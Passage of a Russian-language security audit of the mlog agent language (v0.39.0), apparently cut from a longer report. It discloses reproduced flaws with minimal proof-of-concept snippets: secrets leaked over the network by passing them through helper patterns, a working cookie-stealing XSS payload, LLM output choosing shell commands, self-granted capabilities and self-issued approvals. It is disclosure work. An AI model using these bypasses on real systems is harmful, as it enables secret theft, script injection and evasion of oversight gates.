**Почему не 9.6, как 04.11.** Прошлые оценки (мои и коллеги) опирались на счётчики и гейты самого проекта. Они все зелёные и сейчас. В этот раз я проверял не счётчики, а **поведение продукта** — и главное обещание README («секреты, инъекции и неразрешённые действия отклоняются до запуска») не выдерживает простейшего кода. Это мой пропуск тоже: дыра существует с сентября, я её не искал.

**Три вещи, которые нужно знать:**
1. **Секрет, вывод LLM и ввод пользователя «отмываются» вспомогательным паттерном.** Анализ меток работает только внутри одного паттерна. `mlog check` чист, `mlog run` отправляет секрет в сеть.
2. **`mlog check --root` исполняет программу**, которую должен только проверять, — в обход защитных гейтов.
3. **«13 из 13» Phase 8 — это наличие строк в файлах**, а не работающие возможности. Половина ядер не подключена ни к языку, ни к CLI.

## 2. Критические находки (все воспроизведены на опубликованном v0.39.0)

| # | Находка | Минимальный пример | Что происходит | С какого времени |
|---|---|---|---|---|
| **C‑1** | **Метки не пересекают границу паттерна** | `pattern Key(x) { return env("KEY") }` + `http_post(url, Key("a"))` | `check` — OK, `run` — секрет ушёл в сеть (принят локальным слушателем). То же: секрет как аргумент в паттерн с `print`/`http_post`/`write_file` внутри; цепочка из двух паттернов | с Фазы 1 (сентябрь) |
| | …то же для HTML | `Page(Wrap(query_param("q")))`, где `Page` делает `respond_html` | `serve` отдаёт `<script>alert(document.cookie)</script>` как `text/html` — **рабочий XSS** | |
| | …то же для exec | `Sh(call_llm(...))`, где `Sh` делает `exec` | `check` — OK: вывод модели выбирает shell-команду | |
| **C‑1б** | **Потеря метки внутри одного паттерна** | `each c in split(env("KEY"), "") { acc = acc + c }` → `print(acc)` | утечка; `check` — OK | |
| | | `http_get("https://x/?k=" + env("KEY"))` — **без всяких паттернов** | секрет в URL GET-запроса не считается утечкой | |
| | | `flow Main { … -> P -> output }`, где `P` возвращает `env` | секрет печатается как результат потока | |
| | | `entity key: Secret = env("KEY")` → `print(to_string(key))` | печатает открытый текст | |
| **C‑2** | **`mlog check <файл> --root <корень>` исполняет корень** | корень с `flow Main`, пишущим файл | файл записан, секрет напечатан — **до** анализа и **без** Category‑A гейтов, которые `mlog run` применяет. Справка команды: «without execution» | `src/lib.rs:355`, с 11.06.2026 |
| **H‑1** | **`mlog test` исполняет без гейтов** | тест, вызывающий утечку | `✅ 1/1 tests passed`, секрет напечатан и записан | — |
| **H‑2** | **Импортируемый модуль сам выдаёт себе права** | корень без разрешений; `import dep/evil`, в `evil.mlog` — `profile capability { allow_carrier: "http_post" }` | POST ушёл. Любая зависимость получает сеть/exec своей же декларацией | с 0.36 |
| **H‑3** | **Секрет в тексте ошибки и в HTTP‑ответе** | `to_int(env("KEY"))` в маршруте | клиент получает `500 Handler error: … to_int("TOPSECRET123") …` | — |
| **H‑4** | **Программа одобряет и разрешает сама себя** | `approval_issue("owner", "carrier:cron_run", 60)`; `grant_issue("builtin:http_post", …)` | проходит. ADR‑0211 написан 05.11 и **неделю ждёт твоего выбора варианта** | с 0.36/0.38 |
| **M‑1** | **Аварийное падение на глубоком входе** | 50 000 сложений подряд или 3 000 вложенных `if` | `mlog check` → `stack overflow, aborting` (SIGABRT) | — |
| **M‑2** | **Документация обещает больше** | threat‑model: «interprocedural taint IS tracked, depth 4» | отслеживается один узкий случай (параметр → return, только LLM‑линия). Открытого issue на разрыв нет | — |

**Что устояло** (проверено пробами): SQL‑линия (нелитеральный SQL отклоняется и через паттерны), рантайм‑гейт острых функций без разрешения, отказ `serve` при утечке в маршруте, `secret()` печатается как `[Secret]`, `compile`/`eval`/`repl` применяют гейты, лимит тела 413, лимит рекурсии VM, лимит длины строки, №898 (LLM без настроек — громкий отказ).

**Корень C‑1 в коде.** `semantic.rs:1923 expr_label`: вызов пользовательского паттерна получает метку «объединение аргументов» — тело вызываемого не учитывается; параметры без аннотации считаются `public` («open‑world», ADR‑0154). Сводки `PatternSummary` (`audit.rs:4320`) хранят только «параметр → return». Рантайм‑метки (№328) — копия статического знания, а не метки на значениях, поэтому слепы там же.

**Самое показательное.** Первый боевой потребитель — офис — пользуется этой дырой как штатным приёмом: `dept/utils.mlog:401` — «шов для env‑чтений… **аудитор интра‑процедурен**»; `TgToken()` возвращает `env("TELEGRAM_BOT_TOKEN")`. То есть ограничение известно с наряда №312, а аудит актуальности плана (выпуск №3) записал «TAINT‑статика полная».

## 6. Стратегический план: оценка 6/10

| Сильное | Слабое |
|---|---|
| Ниша названа точно: компиляторный контроль потоков данных для агентов — этого нет ни у кого (и не появилось) | **Несущая конструкция плана не достроена.** Фаза 1, п. 1.3 «эффект‑след в сигнатуре паттерна» и п. 1.7 «метка в `Value`» не сделаны.
